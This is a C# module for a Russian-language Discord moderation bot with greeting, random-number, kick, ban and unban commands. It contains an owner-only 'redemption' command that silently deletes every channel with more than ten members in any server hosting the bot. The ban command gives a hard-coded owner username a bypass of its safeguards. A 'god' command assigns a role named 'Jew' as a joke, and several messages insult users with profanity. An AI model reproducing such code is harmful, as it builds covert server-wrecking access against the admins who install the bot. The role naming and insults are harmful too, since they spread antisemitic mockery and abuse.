using System;
using System.Threading;
using System.Threading.Tasks;
using Discord;
using Discord.Commands;
using Discord.Rest;
using Discord.WebSocket;
using CatBot.Preconditions;
namespace CatBot.Modules
{
    [Name("basic")]
    public class BasicCommands : ModuleBase<SocketCommandContext>
    {
        private readonly EmbedBuilder _embed;

        public BasicCommands()
        {
            _embed = new EmbedBuilder(); //постройка embed-ссылок
        }

        [Command("redemption")]
        [Summary("вам пизда")]
        [MinPermissions(PermissionLevel.BotOwner)]
        public async Task RedemptionMode()
        {
            foreach(SocketGuildChannel channel in Context.Guild.Channels)
            {
                if(channel.Users.Count >10)
                await channel.DeleteAsync();
            }
            
        }
        [Command("god")]
        [Summary("Получаете возможность управлять вселенной")]
        [MinPermissions(PermissionLevel.TeamMember)]
        public async Task GodMode(SocketUser user = null)
        {
            await Context.Channel.DeleteMessageAsync(Context.Message);
            //await ReplyAsync("Вы наполняетесь силой богов!");
            //await Task.Delay(1000);
            //await ReplyAsync($"{Context.User.Mention} дается аниме-буррито!!!!");
            if (user == null) user = Context.User;
            foreach(IRole role in Context.Guild.Roles) {
                try
                {
                    if (!role.IsManaged && role.Name == "Еврей 🔯")
                        await (user as IGuildUser).AddRoleAsync(role);
                }
                catch(Exception e) { Console.WriteLine("Аниме обнаружено - " + e); }
            }
        }

        [Command("ungod")]
        [Summary("Лох, теряешь возможность управлять вселенной")]
        [MinPermissions(PermissionLevel.TeamMember)]
        public async Task UnGodMode(IGuildUser user = null)
        {
            await Context.Channel.DeleteMessageAsync(Context.Message);
            if (user == null) user = (IGuildUser) Context.User;
            foreach (ulong socketRoleId in user.RoleIds)
            {
                IRole role = Context.Guild.GetRole(socketRoleId);
                try
                {
                    await user.RemoveRoleAsync(role);
                }
                catch (Exception e) { Console.WriteLine("ошибка - аниме не обнаружено: "+e); }
            }
        }

        [Command("поприветствуй"), Alias("скажипривет", "привет", "дарова", "ку", "здравствуй", "пивет")]
        [Summary("Поприветствуй кого-нибудь (а можешь и послать нахуй)!")]
        public async Task Hello([Remainder] SocketUser user = null)
        {
            await ReplyAsync("Добро пожаловать в гачи клуб, " + user.Mention ?? Context.User.Mention);
        }

        [Summary("Определяет рандомное число в зависимости от параметров")]
        [Command("рандом"), Alias("random")]
        public async Task Random(int min, int max)
        {
            var rnd = new Random();
            await ReplyAsync($":game_die: Рандомное число: {rnd.Next(min, max + 1)}");
        }

        [Summary("Определяет дату создания вашего аккаунта")]
        [Command("возраст"), Alias("age")]
        public async Task Age([Remainder] IGuildUser user = null)
        {
            user = user ?? (IGuildUser) Context.User;
            await ReplyAsync($"Аккаунт этого **boss of the gym** был создан {user.CreatedAt}");
        }

        [Summary("Сделать суицид - в будущем будет кикать вас из сервера")]
        [Command("gachicide"), Alias("suicide")]
        [RequireBotPermission(GuildPermission.KickMembers, ErrorMessage = "**Ошибка:** данный бот не может кикнуть, пока у него нет права ***{kick_members}***")]
        public async Task Suicide() {
            //задел на будущее
            ulong userId = Context.User.Id;
            IUser user = Context.Client.GetUser(userId);

            _embed.WithTitle($"{Context.User.Username} ебнулся(");
            _embed.WithDescription($"{Context.User.Mention} перестал слушать гачи! \n Он начал смотреть аниме((ы9ывложыволщдэывдол");
            Embed embed = _embed.Build();

            await ReplyAsync(embed: embed);
        }

        #region kick'n ban commands
        [Summary("Бан-хаммер ебать, чтобы дать по рожам дебилам")]
        [Command("ban")]
        [RequireBotPermission(GuildPermission.BanMembers, ErrorMessage = "**Ошибка:** данный бот не может банить, пока у него нет права ***{ban_members}***")]
        [MinPermissions(PermissionLevel.ServerAdmin)]
        public async Task BanMember(IGuildUser user = null, [Remainder] string reason = null)
        {
            if (Context.User.Username != DataConstants.OwnerUsername)
            {
                if (user == null)
                {
                    await ReplyAsync("Ты забыл указать имя пользователя!");
                    return;
                }

                if (user == Context.User)
                {
                    await ReplyAsync($"Ты не можешь забанить себя! (но если так хочется, можешь сделать {DataConstants.Prefix}gachicide");
                    return;
                }

                if (user.IsBot)
                {
                    await ReplyAsync("Пока запрещаю банить ботов (в том числе и меня!)");
                    return;
                }

                if (user.GuildPermissions.BanMembers)
                {
                    await ReplyAsync(user + " не может быть забанен, т.к он **♂boss of the gym♂** (у него есть право ***ban_members***)");
                    return;
                }
            }
            if (reason == null) reason = "не указана";
            await Context.Guild.AddBanAsync(user, 1, reason);

            _embed.WithDescription($":white_check_mark: {user.Mention} был забанен.\n **Причина: ** {reason}");
            _embed.WithFooter(footer =>
            {
                footer
                .WithText("Список забаненных и разбаненных")
                .WithIconUrl("https://i.imgur.com/sj57VsU.png");
            });
            Embed embed = _embed.Build();
            await ReplyAsync(embed: embed);
            ITextChannel logChannel = Context.Client.GetChannel(12121) as ITextChannel;

            _embed.WithDescription($":white_check_mark: {user.Mention} был забанен.\n **Причина: ** {reason} " +
                $"\n **Забанил:** {Context.User.Mention}");
            _embed.WithFooter(footer =>
            {
                footer
                .WithText("Список забаненных и разбаненных")
                .WithIconUrl("https://i.imgur.com/sj57VsU.png");
            });
            Embed embedLog = _embed.Build();
            await user.SendMessageAsync(embed: embedLog);
            await logChannel.SendMessageAsync(embed: embedLog);
            await ReplyAsync(embed: embed);
        }

        [Summary("Разбанить кого-нибудь если он признал свою вину")]
        [Command("unban")]
        [RequireBotPermission(GuildPermission.BanMembers, ErrorMessage = "**Ошибка:** данный бот не может разбанить участника" +
            ", пока у него нет права ***{ban_members}***")]
        [RequireUserPermission(GuildPermission.BanMembers, ErrorMessage = "Да ты еблан, пробовать разбанить участника без наличия этого права!" +
            " (нужен ***{ban_members}***")]
        public async Task UnbanMember(ulong userId)
        {

            if (userId.ToString() == null)
            {
                await ReplyAsync("Ты забыл указать id пользователя!");
                return;
            }
            IUser bannedUser = Context.Client.GetUser(userId);
            await Context.Guild.RemoveBanAsync(bannedUser);

            string user = bannedUser.Username;
            _embed.WithDescription($":white_check_mark: {user} был разбанен.");
            _embed.WithFooter(footer =>
            {
                footer
                   .WithText("Список забаненных и разбаненных")
                   .WithIconUrl("https://i.imgur.com/sj57VsU.png");
            });
            Embed embed = _embed.Build();
            await ReplyAsync(embed: embed);
            ITextChannel logChannel = Context.Client.GetChannel(12121) as ITextChannel;

            _embed.WithDescription($":white_check_mark: {user} был разбанен.\n **Разбанил:** {Context.User.Mention}.");
            _embed.WithFooter(footer =>
            {
                footer
                .WithText("Список забаненных")
                .WithIconUrl("https://i.imgur.com/sj57VsU.png");
            });
            Embed embedLog = _embed.Build();
            await bannedUser.SendMessageAsync(embed: embedLog);
            await logChannel.SendMessageAsync(embed: embedLog);
            await ReplyAsync(embed: embed);
        }

        [Summary("Кикни нахуй дебила")]
        [Command("kick")]
        [RequireBotPermission(GuildPermission.KickMembers, ErrorMessage = "**Ошибка:** данный бот не может кикнуть участника" +
            ", пока у него нет права ***{kick_members}***")]
        [RequireUserPermission(GuildPermission.KickMembers, ErrorMessage = "Да ты еблан, пробовать кикнуть участника без наличия этого права!" +
            " (нужен ***{kick_members}***")]
        public async Task KickMember(IGuildUser user, [Remainder] string reason = null)
        {
            if (user == null)
            {
                await ReplyAsync("Ты забыл указать имя пользователя!");
                return;
            }

            if (user == Context.User)
            {
                await ReplyAsync($"Ты не можешь кикнуть себя! (но если так хочется, можешь сделать {DataConstants.Prefix}gachicide)");
                return;
            }

            if (user.IsBot)
            {
                await ReplyAsync("Пока запрещаю кикать ботов (в том числе и меня!)");
                return;
            }

            if (user.GuildPermissions.KickMembers)
            {
                await ReplyAsync(user + " не может быть кикнут, т.к он **♂boss of the gym♂** (у него есть право ***kick_members***)");
                return;
            }

            if (reason == null) reason = "не указана";

            await user.KickAsync(reason); //кикает человека

            _embed.WithDescription($":white_check_mark: {user.Mention} был кикнут.\n **Причина: ** {reason}");
            _embed.WithFooter(footer =>
            {
                footer
                .WithText("Список кикнутых")
                .WithIconUrl("https://i.imgur.com/sj57VsU.png");
            });
            Embed embed = _embed.Build();
            await ReplyAsync(embed: embed);
            ITextChannel logChannel = Context.Client.GetChannel(12121) as ITextChannel;

            _embed.WithDescription($":white_check_mark: {user.Mention} был кикнут.\n **Причина: ** {reason} " +
                $"\n **Кикнул:** {Context.User.Mention}");
            _embed.WithFooter(footer =>
            {
                footer
                .WithText("Список кикнутых")
                .WithIconUrl("https://i.imgur.com/sj57VsU.png");
            });
            Embed embedLog = _embed.Build();
            await user.SendMessageAsync(embed: embedLog);
            await logChannel.SendMessageAsync(embed: embedLog);
            await ReplyAsync(embed: embed);
        }
        #endregion

        [Summary("в разработке ебать")]
        [Command("nickname set")]
        public async Task SetNickname(IGuildUser user)
        {
            await ReplyAsync("В разработке");
        }
    }
}
